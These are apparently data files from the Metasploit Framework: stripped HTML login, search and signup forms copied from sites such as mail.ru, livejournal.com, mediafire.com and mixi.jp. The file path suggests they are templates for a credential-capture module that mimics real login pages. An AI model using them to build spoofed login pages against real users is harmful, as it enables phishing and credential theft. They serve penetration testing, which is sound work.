{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/linternaute.com.txt", "content": "<form name='recherche_interne' action='/recherche/' method='post' id='search'> <input name=\"f_recherche\" class=\"recherche\" type=\"text\" id=\"tetiere_f_recherche\" maxlength=\"60\" /><input name=\"f_niveau_filiation\" type=\"hidden\" value=\"\" /></form><form name='tetiere_formulaire_authentification' action='http://www.linternaute.com/moncompte/connexion/' method='post' id='tetiere_formulaire_authentification'> <input name=\"f_url_redirect\" type=\"hidden\" value=\"\" /><input name=\"f_auth_identifiant\" type=\"text\" id=\"f_auth_identifiant\" value=\"\" /><input name=\"f_auth_mot_de_passe_text\" type=\"text\" id=\"f_auth_mot_de_passe_text\" value=\"\" /><input name=\"f_auth_mot_de_passe\" type=\"password\" id=\"f_auth_mot_de_passe\" /></form><form action='http://benchmail.linternaute.com/asp/abonnement/abonne.asp' method='post' target='_blank'> <input name=\"MAB\" type=\"hidden\" value=\"\" /><input name=\"ml\" size=\"16\" class=\"petit\" type=\"text\" value=\"\" /><input name=\"submit2\" class=\"bouton\" type=\"image\" src=\"/image/homepage/sponsor/MODELE/ok.gif\" /></form><form name='form1' action='http://www.linternaute.com/questionnaire/cgi/questionnaire/valide_questionnaire.php' method='post' target='_blank'> <input name=\"f_id_sondage\" type=\"hidden\" value=\"\" /><input name=\"f_id_type\" type=\"hidden\" value=\"\" /><input name=\"f_flag_fiche\" type=\"hidden\" value=\"\" /><input name=\"f_ordre_tri\" type=\"hidden\" value=\"\" /><input name=\"f_tri\" type=\"hidden\" value=\"\" /><input name=\"f_force\" type=\"hidden\" value=\"\" /><input name=\"f_fil\" type=\"hidden\" value=\"\" /><input name=\"question_21303\" type=\"radio\" value=\"\" /><input name=\"question_21303\" type=\"radio\" value=\"\" /><input name=\"question_21303\" type=\"radio\" value=\"\" /><input name=\"question_21303\" type=\"radio\" value=\"\" /><input name=\"question_21303\" type=\"radio\" value=\"\" /></form><form name='formulaire_recherche_corps' action='http://www.linternaute.com/dictionnaire/fr/cgi/recherche/recherche.php' method='post' target='_blank'> <input name=\"f_terme\" size=\"23\" type=\"text\" id=\"f_terme_definition\" value=\"\" onfocus=\"javascript:this.value=''\" /><input name=\"lance_recherche\" src=\"\" type=\"image\" height=\"14\" style=\"padding: 3px 0pt 0pt 5px;\" width=\"68\" /></form>", "timestamp": "2025-10-24T23:40:51.425648"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/live.com.txt", "content": "<form class='sw_box' action='http://search.live.com/results.aspx' id='sb_form'> <input name=\"q\" class=\"sw_qbox\" title=\"Search for\" type=\"text\" id=\"sb_form_q\" value=\"\" /><input name=\"go\" tabindex=\"0\" class=\"sw_qbtn\" title=\"Search\" type=\"submit\" id=\"sb_form_go\" value=\"\" /><input name=\"form\" type=\"hidden\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:51.761304"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/livedoor.com.txt", "content": "<form name='search-form' action='http://search.rd.livedoor.com/r/' id='search-form' method='get'> <input name=\"k\" type=\"hidden\" id=\"k\" value=\"\" /><input name=\"ie\" type=\"hidden\" value=\"\" /><input name=\"c\" type=\"hidden\" id=\"search-c\" value=\"\" /><input name=\"flag\" type=\"hidden\" id=\"flag\" value=\"\" /><input name=\"q\" class=\"q\" type=\"text\" id=\"q\" value=\"\" /><input name=\"search_btn\" class=\"bt\" type=\"image\" src=\"\" value=\"\" alt=\"\u691c\u7d22\" /></form><form name='sf' action='http://search.rd.livedoor.com/r/' id='sf' method='get'> <input name=\"ie\" type=\"hidden\" value=\"\" /><input name=\"q\" class=\"q\" type=\"text\" value=\"\" /><input name=\"search\" class=\"bt\" type=\"image\" src=\"\" value=\"\" alt=\"\u691c\u7d22\" /></form>", "timestamp": "2025-10-24T23:40:52.082625"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/liveinternet.ru.txt", "content": "<form name='stat_login_form' action='/stat/' method='post'> <input name=\"url\" tabindex=\"1\" size=\"15\" type=\"text\" value=\"\" maxlength=\"60\" /><input name=\"password\" tabindex=\"2\" size=\"6\" type=\"password\" maxlength=\"20\" /></form><form name='diary_login_form' action='/member.php' method='post'> <input name=\"action\" type=\"hidden\" value=\"\" style=\"display:none;\" /><input name=\"charset\" type=\"hidden\" value=\"\" style=\"display:none;\" /><input name=\"username\" tabindex=\"1\" type=\"text\" /><input name=\"password\" tabindex=\"2\" type=\"password\" /></form><form name='mail_login_form' action='http://mail.li.ru/LOGIN' method='post'> <input name=\"destination\" type=\"hidden\" value=\"\" style=\"display:none;\" /><input name=\"credential_2\" type=\"hidden\" value=\"\" style=\"display:none;\" /><input name=\"credential_0\" tabindex=\"1\" type=\"text\" id=\"login\" maxlength=\"40\" /><input name=\"credential_1\" tabindex=\"2\" type=\"password\" id=\"password\" /><input name=\"credential_3\" type=\"hidden\" value=\"\" /><input name=\"credential_4\" type=\"hidden\" value=\"\" /><input name=\"credential_5\" type=\"hidden\" value=\"\" /><input name=\"credential_6\" type=\"hidden\" value=\"\" /></form><form action='http://www.liveinternet.ru/journal_redirect.php' id='GlobalSrcForm' method='post'> <input name=\"string\" type=\"text\" id=\"GlobalSrcFormRTxt\" /><input type=\"submit\" id=\"GlobalSrcFormRBtn\" value=\"\" onclick=\"document.getElementById('GlobalSrcForm').submit(); return false;\" /><input name=\"stype\" checked=\"checked\" type=\"radio\" id=\"snet\" value=\"\" /><input name=\"stype\" type=\"radio\" id=\"ssite\" value=\"\" /><input name=\"stype\" type=\"radio\" id=\"suser\" value=\"\" /><input name=\"stype\" type=\"radio\" id=\"sstat\" value=\"\" /><input name=\"stype\" type=\"radio\" id=\"smarket\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:52.410665"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/livejournal.com.txt", "content": "<form class='getstarted-home' action='http://www.livejournal.com/create.bml' method='get'> <input name=\"user\" size=\"20\" type=\"text\" maxlength=\"16\" /><input name=\"submit\" class=\"start\" type=\"submit\" value=\"\" /></form><form action='http://www.livejournal.com/multisearch.bml' method='post'> <input name=\"q\" size=\"12\" type=\"text\" id=\"SearchText\" value=\"\" onfocus=\"if(this.value=='Find')this.value='';\" onblur=\"if(this.value=='')this.value='Find';\" /><input type=\"submit\" value=\"\" /></form><form class='lj_login_form' action='http://www.livejournal.com/login.bml?ret=1' method='post' id='login' style='margin: 0; padding: 0;'> <input name=\"mode\" type=\"hidden\" value=\"\" /><input name=\"chal\" class=\"lj_login_chal\" type=\"hidden\" value=\"\" /><input name=\"response\" class=\"lj_login_response\" type=\"hidden\" value=\"\" /><input name=\"user\" tabindex=\"1\" size=\"24\" type=\"text\" id=\"login_user\" /><input name=\"password\" tabindex=\"2\" size=\"15\" class=\"lj_login_password\" type=\"password\" /><input tabindex=\"3\" type=\"submit\" value=\"\" /><input name=\"remember_me\" tabindex=\"4\" type=\"checkbox\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:52.733275"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/mail.ru.txt", "content": "<form name='MSearch' action='http://go.mail.ru/search' onsubmit='return CheckQ(this);'> <input name=\"lfilter\" type=\"hidden\" value=\"\" /><input name=\"mailru\" type=\"hidden\" value=\"\" /><input name=\"q\" type=\"text\" /><input type=\"submit\" value=\"\" /></form><form action='http://my.mail.ru/cgi-bin/my/search'> <input name=\"search\" type=\"hidden\" value=\"\" /><input name=\"typeBare\" type=\"hidden\" value=\"\" /><input name=\"from_mailru_main\" type=\"hidden\" value=\"\" /><input name=\"firstname\" type=\"text\" /><input type=\"text\" style=\"display: none;\" /><input name=\"lastname\" type=\"text\" /><input type=\"submit\" value=\"\" /></form><form name='Auth' action='http://win.mail.ru/cgi-bin/auth' method='post'> <input name=\"Mpopl\" type=\"hidden\" value=\"\" /><input name=\"Login\" tabindex=\"1\" size=\"10\" class=\"long\" type=\"text\" value=\"\" /><input name=\"Password\" tabindex=\"3\" size=\"15\" class=\"long\" type=\"password\" value=\"\" /><input name=\"level\" tabindex=\"4\" class=\"check\" type=\"checkbox\" id=\"alien\" value=\"\" /><input tabindex=\"5\" class=\"submit\" type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:53.378154"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/maktoob.com.txt", "content": "<form name='form1' action='searchResult.php' method='get' onsubmit='if(go_search_ar==true)return true;else return false;'> <input name=\"q\" tabindex=\"4\" class=\"search-field\" type=\"text\" onkeyup=\"return arabySearch(event.keyCode);\" value=\"\" /><input name=\"B1\" class=\"h-searchbox-submit\" type=\"button\" value=\"\" align=\"middle\" onclick=\"return arabySearch(13)\" /></form><form name='theForm' action='https://services.maktoob.com/login.php?mm=2008423473815257' onsubmit='return checkLogin()' method='post'> <input name=\"meuser\" tabindex=\"1\" size=\"25\" class=\"brdr\" type=\"text\" maxlength=\"32\" /><input name=\"remember_me\" checked=\"checked\" type=\"checkbox\" id=\"chk\" value=\"\" /><input name=\"password\" tabindex=\"2\" size=\"25\" class=\"brdr fix\" type=\"password\" maxlength=\"20\" /><input name=\"B2\" type=\"submit\" value=\"\" /></form><form name='dic' action='' method='post'> </form>", "timestamp": "2025-10-24T23:40:53.729987"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/mapquest.com.txt", "content": "<form autocomplete='off' action='http://search.aol.com/aol/search' method='get' onsubmit='ua.a(:MQ08AOLSearch);return true;'> <input name=\"query\" tabindex=\"50\" type=\"text\" id=\"aolinput\" value=\"\" onfocus=\"mq.util.helperTextOnFocus(this,'Search the Web');\" onchange=\"mq.util.helperTextOnBlurOnChange(this,'Search the Web');\" style=\"color:#666;\" onblur=\"mq.util.helperTextOnBlurOnChange(this,'Search the Web');\" /><input name=\"invocationType\" type=\"hidden\" id=\"aolsearchid\" value=\"\" /><input tabindex=\"2\" class=\"aolbtnalt\" type=\"submit\" id=\"web-button\" value=\"\" /></form><form autocomplete='off' class='mapFive' action='/maps/map.adp' id='maps-form' method='get'> <input tabindex=\"1\" name=\"cat\" class=\"searchInput\" type=\"text\" id=\"maps0-query\" value=\"\" maxlength=\"100\" /><input tabindex=\"2\" name=\"address\" class=\"addrInput\" type=\"text\" id=\"maps0-address\" value=\"\" /><input tabindex=\"3\" name=\"city\" class=\"cityInput\" type=\"text\" id=\"maps0-city\" value=\"\" /><input tabindex=\"4\" name=\"state\" class=\"stateInput\" type=\"text\" id=\"maps0-state\" value=\"\" maxlength=\"2\" /><input tabindex=\"5\" name=\"zip\" class=\"zipInput\" type=\"text\" id=\"maps0-zip\" value=\"\" maxlength=\"10\" /></form><form autocomplete='off' class='dirFive' action='/directions/main.adp' id='dir-form' method='get'> <input name=\"go\" type=\"hidden\" value=\"\" /><input tabindex=\"7\" name=\"1pn\" class=\"searchInput\" type=\"text\" id=\"dir0-query\" value=\"\" maxlength=\"100\" /><input tabindex=\"8\" name=\"1a\" class=\"addrInput\" type=\"text\" id=\"dir0-address\" value=\"\" /><input tabindex=\"9\" name=\"1c\" class=\"cityInput\" type=\"text\" id=\"dir0-city\" value=\"\" /><input tabindex=\"10\" name=\"1s\" class=\"stateInput\" type=\"text\" id=\"dir0-state\" value=\"\" maxlength=\"2\" /><input tabindex=\"11\" name=\"1z\" class=\"zipInput\" type=\"text\" id=\"dir0-zip\" value=\"\" maxlength=\"10\" /><input tabindex=\"12\" name=\"2pn\" class=\"searchInput\" type=\"text\" id=\"dir1-query\" value=\"\" maxlength=\"100\" /><input tabindex=\"13\" name=\"2a\" class=\"addrInput\" type=\"text\" id=\"dir1-address\" value=\"\" /><input tabindex=\"14\" name=\"2c\" class=\"cityInput\" type=\"text\" id=\"dir1-city\" value=\"\" /><input tabindex=\"15\" name=\"2s\" class=\"stateInput\" type=\"text\" id=\"dir1-state\" value=\"\" maxlength=\"2\" /><input tabindex=\"16\" name=\"2z\" class=\"zipInput\" type=\"text\" id=\"dir1-zip\" value=\"\" maxlength=\"10\" /><input tabindex=\"17\" checked name=\"r\" class=\"alignm radio\" type=\"radio\" id=\"dir.fastest\" value=\"\" /><input tabindex=\"18\" name=\"r\" class=\"alignm radio\" type=\"radio\" id=\"dir.shortest\" value=\"\" /><input tabindex=\"19\" name=\"aoh\" class=\"alignm radio\" type=\"checkbox\" id=\"dir.aoh\" value=\"\" /><input tabindex=\"20\" name=\"aot\" class=\"alignm radio\" type=\"checkbox\" id=\"dir.aot\" value=\"\" /><input tabindex=\"21\" name=\"aos\" class=\"alignm radio\" type=\"checkbox\" id=\"dir.aos\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:54.056503"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/marca.com.txt", "content": "<form name='formulariobusqueda1' action='http://www.marca.com/rec-templating/templates/marca/cmp/buscador.jsp' method='get'> <input name=\"txtW\" type=\"hidden\" id=\"txtW\" value=\"\" /><input name=\"num\" type=\"hidden\" value=\"\" /><input name=\"searchselector\" type=\"hidden\" value=\"\" /><input name=\"q\" size=\"25\" class=\"buscar\" type=\"text\" id=\"q\" value=\"\" onfocus=\"cambiarColor(this.id);\" onblur=\"restauraColor(this.id);\" maxlength=\"256\" /><input checked=\"\" name=\"rbDonde\" type=\"radio\" id=\"rbDonde\" value=\"\" onclick=\"formAction(this.value);\" /><input name=\"rbDonde\" type=\"radio\" id=\"rbDonde\" value=\"\" onclick=\"formAction(this.value);\" /><input name=\"sa\" type=\"image\" src=\"\" alt=\"Buscar\" /></form><form action='http://marcawas5.recoletos.es/Servicios/Encuestas/Controlador' method='post'> <input name=\"ID\" type=\"hidden\" value=\"\" /><input name=\"style\" type=\"hidden\" value=\"\" /><input name=\"1\" type=\"radio\" id=\"opcion1\" value=\"\" /><input name=\"1\" type=\"radio\" id=\"opcion2\" value=\"\" /><input name=\"1\" type=\"radio\" id=\"opcion3\" value=\"\" /><input name=\"1\" type=\"radio\" id=\"opcion4\" value=\"\" /><input name=\"Submit\" type=\"submit\" value=\"\" /></form><form name='formMarcador' id='formMarcador'> </form><form name='formularioJugandoVoy' action='' id='formularioJugandoVoy'> <input name=\"idMarcado\" type=\"hidden\" value=\"\" /><input name=\"oddsMarcado\" type=\"hidden\" value=\"\" /><input name=\"importe\" class=\"importe\" type=\"text\" onkeyup=\"javascript: eliminaNoNumericos(); calcularApuestaImporteJugado();\" value=\"\" /></form><form name='f1' action='http://ligafantastica.marca.com/2007-08/' method='post' style='width:975px;'> <input name=\"opcion\" type=\"hidden\" value=\"\" /><input name=\"nick\" type=\"text\" /><input name=\"clave\" type=\"password\" /><input name=\"Submit\" class=\"boton\" type=\"submit\" value=\"\" onclick=\"entrar();\" /></form>", "timestamp": "2025-10-24T23:40:54.388449"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/marketgid.com.txt", "content": "<form action='http://goods.marketgid.com/search/' id='search' method='get'> <input name=\"query\" type=\"text\" value=\"\" style=\"width:80%;\" /><input class=\"search\" type=\"submit\" value=\"\" /></form><form action='http://usr.marketgid.com/creative/auth/' id='mg-auth-form-1' method='post'> <input name=\"login\" tabindex=\"1\" size=\"25\" type=\"text\" id=\"login\" value=\"\" onfocus=\"form_change(this)\" onblur=\"form_change(this)\" /><input name=\"pass\" tabindex=\"2\" size=\"25\" type=\"password\" id=\"pass\" value=\"\" onfocus=\"form_change(this)\" onblur=\"form_change(this)\" /><input tabindex=\"3\" class=\"submit-button\" type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:54.730394"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/mediafire.com.txt", "content": "<form name='form_login1' class='form' action='dynamic/login.php' id='form_login1' method='post' target='userwork'> <input name=\"login_email\" class=\"login_box\" type=\"text\" id=\"login_email\" onfocus=\"this.style.background='#ffc';\" onblur=\"this.style.background='#fff';\" /><input name=\"login_pass\" class=\"login_box\" type=\"password\" id=\"login_pass\" onfocus=\"this.style.background='#ffc';\" onblur=\"this.style.background='#fff';\" /><input name=\"login_remember\" checked type=\"checkbox\" id=\"login_remember\" /><input name=\"submit_login\" type=\"submit\" id=\"submit_login\" value=\"\" /></form><form name='form_reg' class='form' action='dynamic/register.php' id='form_reg' method='post' target='userwork'> <input name=\"reg_email\" class=\"login_box\" type=\"text\" id=\"reg_email\" onfocus=\"this.style.background='#ffc';\" onblur=\"this.style.background='#fff';\" /><input name=\"reg_pass\" class=\"login_box\" type=\"password\" id=\"reg_pass\" onfocus=\"this.style.background='#ffc';\" onblur=\"this.style.background='#fff';\" /><input name=\"reg_pass2\" class=\"login_box\" type=\"password\" id=\"reg_pass2\" onfocus=\"this.style.background='#ffc';\" onblur=\"this.style.background='#fff';\" /><input name=\"reg_submit\" type=\"submit\" id=\"reg_submit\" value=\"\" /></form><form name='controls' class='form'> </form><form name='form_upload' class='form' enctype='multipart/form-data' action='' method='POST' id='form_upload'> <input size=\"58\" class=\"browse\" type=\"text\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:55.038196"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/meebo.com.txt", "content": "<form action='https://www.meebo.com/' onsubmit='try{gFrontPage.loginUser();}catch(e){alert(gLang.frontPageError)}finally{return false;}' id='frontpagecontainer'> <input tabindex=\"2\" autocomplete=\"off\" type=\"text\" id=\"meeboid\" onfocus=\"if (!ui.isSafari) { this.style.margin = '0'; this.style.borderWidth = '2px'; this.style.backgroundColor = '#FFFFFF'; }\" onblur=\"this.style.margin = '1px'; this.style.borderWidth = '1px'; this.style.backgroundColor = '#E9F0F5';\" /><input tabindex=\"2\" autocomplete=\"off\" type=\"password\" id=\"meebopassword\" onfocus=\"if (!ui.isSafari) { this.style.margin = '0'; this.style.borderWidth = '2px'; this.style.backgroundColor = '#FFFFFF'; }\" onblur=\"this.style.margin = '1px'; this.style.borderWidth = '1px'; this.style.backgroundColor = '#E9F0F5';\" /><input tabindex=\"2\" type=\"checkbox\" id=\"remembermecheck\" onchange=\"if (!this.checked) { eraseCookie('mid'); eraseStorage('meebopassword'); }\" /><input tabindex=\"1\" type=\"checkbox\" id=\"invisiblecheck\" /><input type=\"submit\" style=\"position:absolute; top:-999px; left:-999px;\" /></form>", "timestamp": "2025-10-24T23:40:55.370823"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/megaupload.com.txt", "content": "<form action='http://www.megaupload.com/googleframe.php?ads=newflash&l=en&bgcolor=F8F3E9' method='POST' id='abform' target='abframe'> </form><form name='paymentform' action='https://www.paypal.com/cgi-bin/webscr' method='post' id='paymentform'> <input name=\"cmd\" type=\"hidden\" value=\"\" /><input name=\"business\" type=\"hidden\" value=\"\" /><input name=\"item_name\" type=\"hidden\" value=\"\" /><input name=\"no_note\" type=\"hidden\" value=\"\" /><input name=\"no_shipping\" type=\"hidden\" value=\"\" /><input name=\"currency_code\" type=\"hidden\" value=\"\" /><input name=\"item_number\" type=\"hidden\" value=\"\" /></form><form name='uploadform' enctype='multipart/form-data' action='http://www195.megaupload.com/upload_done.php?UPLOAD_IDENTIFIER=281261284.1216012156' method='POST' style='display: inline;' target='uploadframe'> <input name=\"filecount\" type=\"hidden\" value=\"\" /><input name=\"multifile[1]\" size=\"35\" class=\"file\" type=\"file\" id=\"my_file_element\" style=\"\" /><input name=\"UPLOAD_IDENTIFIER\" type=\"hidden\" value=\"\" /><input name=\"sessionid\" type=\"hidden\" value=\"\" /><input name=\"file\" size=\"43\" class=\"file\" onkeypress=\"document.uploadform.url.value='';\" type=\"file\" onkeyup=\"document.uploadform.url.value='';\" value=\"\" onchange=\"document.uploadform.url.value='';\" style=\"width:357px;\" /><input name=\"toemail\" class=\"text\" type=\"text\" style=\"width:178px;\" /><input name=\"fromemail\" class=\"text\" type=\"text\" style=\"width:178px;\" /><input name=\"message\" class=\"text\" type=\"text\" style=\"width:269px;\" maxlength=\"100\" /><input name=\"multiemail\" class=\"text\" readonly type=\"text\" onclick=\"document.location='http://www.megaupload.com/premium/';\" style=\"width:178px;\" /><input name=\"password\" class=\"text\" readonly type=\"text\" onclick=\"document.location='http://www.megaupload.com/premium/';\" style=\"width:178px;\" maxlength=\"8\" /><input name=\"url\" class=\"text\" readonly type=\"text\" onclick=\"document.location='http://www.megaupload.com/premium/';\" style=\"width:269px;\" maxlength=\"256\" /><input name=\"accept\" class=\"checkbox\" type=\"checkbox\" /></form><form name='progressform' action='http://www195.megaupload.com/up.php?UPLOAD_IDENTIFIER=281261284.1216012156' method='post' value='' target='uploadprogress'> </form><form name='loginform' action='' method='POST'> <input name=\"login\" type=\"hidden\" /><input name=\"password\" type=\"hidden\" /></form>", "timestamp": "2025-10-24T23:40:56.008009"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/megavideo.com.txt", "content": "<form action='?' method='post' id='logoutform'> <input name=\"logout\" type=\"hidden\" value=\"\" /></form><form action='ajaxvideos.php' method='POST' id='ajaxfrm' target='ajaxframe'> <input name=\"type\" type=\"hidden\" id=\"ajaxtype\" /></form><form action='?s=signup' method='post' id='loginfrm'> <input name=\"action\" type=\"hidden\" value=\"\" /><input name=\"nickname\" type=\"text\" style=\"width:161px; font-size:12px; height:20px; background-color:#F7F7F7; border: 1px solid #C2C2C2;\" /><input name=\"password\" type=\"password\" style=\"width:161px; font-size:12px; height:20px; background-color:#F7F7F7; border: 1px solid #C2C2C2;\" /></form><form method='GET' id='searchfrm'> <input name=\"c\" type=\"hidden\" value=\"\" /><input name=\"s\" type=\"text\" value=\"\" style=\"width:265px; height:20px;\" /></form>", "timestamp": "2025-10-24T23:40:56.320796"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/mercadolibre.com.ar.txt", "content": "<form name='fheader' action='/jm/search' method='get' onsubmit='setPrCategID();setSearchFlags(fheader);'> <input name=\"as_pr_categ_id\" type=\"hidden\" value=\"\" /><input name=\"as_word\" size=\"13\" class=\"txtbox\" type=\"text\" maxlength=\"60\" /><input type=\"image\" src=\"/org-img/homed/bot_irh.gif\" border=\"0\" id=\"MENU:BUSCAD\" alt=\"Buscar\" align=\"top\" onclick=\"javascript:document.fheader.submit();\" /></form>", "timestamp": "2025-10-24T23:40:56.639656"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/mercadolivre.com.br.txt", "content": "<form name='fheader' action='/jm/search' method='get' onsubmit='setPrCategID();setSearchFlags(fheader);'> <input name=\"as_pr_categ_id\" type=\"hidden\" value=\"\" /><input name=\"as_word\" size=\"13\" class=\"txtbox\" type=\"text\" maxlength=\"60\" /><input type=\"image\" src=\"/org-img/homed/bot_okh.gif\" border=\"0\" id=\"MENU:BUSCAD\" alt=\"Buscar\" align=\"top\" onclick=\"javascript:document.fheader.submit();\" /></form>", "timestamp": "2025-10-24T23:40:57.260580"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/metacafe.com.txt", "content": "<form action='#' method='get' id='HeaderSearchForm'> <input name=\"s\" tabindex=\"7\" size=\"10\" class=\"InputTextField\" type=\"text\" id=\"HeaderSearchInput\" /><input tabindex=\"8\" class=\"ButtonGo FormSubmitButton\" type=\"image\" src=\"\" /></form><form action='.' id='LocaleFormMinimal' method='post'> <input name=\"country\" type=\"hidden\" /></form><form action='.' id='LocaleForm' method='post'> <input name=\"SaveLocaleSettings\" type=\"submit\" id=\"SelectButton\" value=\"\" /><input name=\"CancelLocaleSettings\" type=\"button\" id=\"LocaleCancelButton\" value=\"\" /></form><form id='CatalogCategories' method='get'> </form><form id='CatalogCategories' method='get'> </form><form id='CatalogCategories' method='get'> </form><form action='http://www.feedblitz.com/f/f.fbz?AddNewUserDirect' method='post'> <input name=\"EMAIL\" size=\"20\" class=\"TextField\" type=\"text\" id=\"Email\" value=\"\" maxlength=\"255\" /><input name=\"FEEDID\" type=\"hidden\" value=\"\" /><input class=\"FormSubmitButton\" type=\"image\" src=\"\" id=\"SubscribeButton\" /></form>", "timestamp": "2025-10-24T23:40:57.584664"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/metroflog.com.txt", "content": "<form action='/' method='post'> <input name=\"username\" size=\"20\" class=\"text\" type=\"text\" value=\"\" /><input name=\"password\" size=\"20\" class=\"text\" type=\"password\" /><input name=\"Recordar\" checked type=\"checkbox\" id=\"Recordar\" value=\"\" /><input name=\"enviar\" type=\"submit\" value=\"\" style=\"background-color:#FFFFFF; color:#FF0000; font-weight:bold; width:70px; font-size:12px\" /><input name=\"Registrarse2\" class=\"bt_rg\" type=\"button\" value=\"\" onclick=\"location.href='signup.php';\" /></form>", "timestamp": "2025-10-24T23:40:57.924474"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/mforos.com.txt", "content": "<form class='matb_search_form' action='http://click.miarroba.com/' method='POST' onsubmit='return toolbarMiarroba.mtb_checkform(this);'> <input name=\"mtb_search_what\" class=\"matb_search_input\" type=\"text\" /><input name=\"mtb_search_submit\" class=\"matb_search_submit\" type=\"image\" src=\"\" /></form><form action='/topics/' method='get'> <input name=\"q\" class=\"caja_texto\" type=\"text\" value=\"\" maxlength=\"100\" style=\"width:30%\" /><input class=\"boton_submit\" type=\"submit\" value=\"\" /></form><form action='/boards/' method='get'> <input name=\"f\" class=\"caja_texto\" type=\"text\" value=\"\" style=\"width:50%\" /><input class=\"boton_submit\" type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:58.236578"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/microsoft.com.txt", "content": "<form name='aspnetForm' action='default.aspx' method='post' id='aspnetForm'> <input name=\"__VIEWSTATE\" type=\"hidden\" id=\"__VIEWSTATE\" value=\"\" /><input name=\"ctl00$cspMscomSearch$SearchArea\" title=\"Search Input Area\" onkeypress=\"return mNav_SearchControlKeyPress(event);\" type=\"text\" id=\"ctl00_cspMscomSearch_SearchArea\" /><input name=\"ctl00$cspMscomSearch$Submit\" title=\"Go\" type=\"image\" src=\"/en/us/shared/templates/components/cspMscomMasterNavigation/icon_search.gif\" id=\"ctl00_cspMscomSearch_Submit\" style=\"border-width:0px;\" /><input name=\"__EVENTVALIDATION\" type=\"hidden\" id=\"__EVENTVALIDATION\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:58.553075"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/milliyet.com.tr.txt", "content": "<form name='frmAdvert' action='Default.aspx?Date=23.04.2008&aType=AnaSayfa&fc=ok' method='post' id='frmAdvert'> <input name=\"__VIEWSTATE\" type=\"hidden\" id=\"__VIEWSTATE\" value=\"\" /></form><form name='frmSinema' method='post' target='myNewWin'> </form><form name='registerform' onkeydown='if (event.keyCode==13) BultenEmailiKaydet(document.getElementById(EMail),http://www.milliyet.com.tr/); if (event.keyCode==13) return false;' method='post'> <input name=\"EMail\" size=\"20\" class=\"MG_inpTxt2\" type=\"text\" id=\"EMail\" value=\"\" onfocus=\"if(this.value == 'E-posta Adresiniz') this.value='';\" onblur=\"if(this.value == '') this.value='E-posta Adresiniz' ;\" /></form><form name='frmAltSayfalar' method='post' target='myNewWin'> </form>", "timestamp": "2025-10-24T23:40:58.876452"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/minijuegos.com.txt", "content": "<form name='f' action='busqueda.php' method='get'> <input name=\"cnb\" type=\"hidden\" value=\"\" /><input name=\"termino\" type=\"text\" value=\"\" style=\"float:left;width:185px;height:19px;line-height:19px;font-size:14px;vertical-align:text-bottom;background-color:#d6e4ef;border-color:#006599\" /><input type=\"image\" src=\"/imagenes/bot_buscar.gif\" style=\"float:left;margin-left:5px;display:inline;border:0px;vertical-align:text-bottom;cursor:pointer\" /></form>", "timestamp": "2025-10-24T23:40:59.538397"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/mininova.org.txt", "content": "<form action='/search/' id='searchform' method='get'> <input name=\"search\" size=\"35\" type=\"text\" id=\"search\" /><input class=\"button\" type=\"submit\" value=\"\" /><input name=\"usenext\" class=\"button\" type=\"submit\" value=\"\" /><input name=\"websearch\" class=\"button\" type=\"submit\" value=\"\" onclick=\"document.forms.searchform.target = '_blank'\" /></form>", "timestamp": "2025-10-24T23:40:59.852392"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/mixi.jp.txt", "content": "<form name='login_form' action='/login.pl' method='post'> <input name=\"next_url\" type=\"hidden\" value=\"\" /><input tabindex=\"1\" name=\"email\" size=\"30\" style=\"width:199px;height:20px;\" /><input tabindex=\"2\" name=\"password\" type=\"password\" style=\"width:199px;height:20px;\" /><input tabindex=\"3\" name=\"sticky\" type=\"checkbox\" /><input tabindex=\"4\" type=\"image\" src=\"\" alt=\"\u00a5\u00ed\u00a5\u00b0\u00a5\u00a4\u00a5\u00f3\" style=\"border:0px; padding:0; background:none;\" /></form>", "timestamp": "2025-10-24T23:41:00.189624"}
